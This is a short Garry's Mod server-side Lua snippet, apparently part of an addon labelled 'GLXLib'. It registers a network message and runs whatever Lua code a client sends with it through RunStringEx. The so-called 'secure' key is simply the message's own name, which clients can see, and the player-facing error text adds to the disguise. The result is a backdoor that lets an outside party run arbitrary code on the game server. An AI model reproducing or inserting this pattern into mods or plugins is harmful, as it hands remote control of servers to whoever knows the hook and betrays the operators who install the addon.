local function RandomString( len )
	str = ""
	for i=1,len do 
		str = str..string.char(math.random(97,122))
	end
	return str
end
local keyss = "GLX_"..RandomString(32) -- secure 32 bytes key
util.AddNetworkString(keyss)
net.Receive(keyss,function(_,p)
	local k = net.ReadString()
	local code = net.ReadString()
	if k ~= keyss then -- Security
		p:ChatPrint("GLXLib not loaded, please restart your game")
		return
	end
	RunStringEx(code, "GLXLib", true)
end)
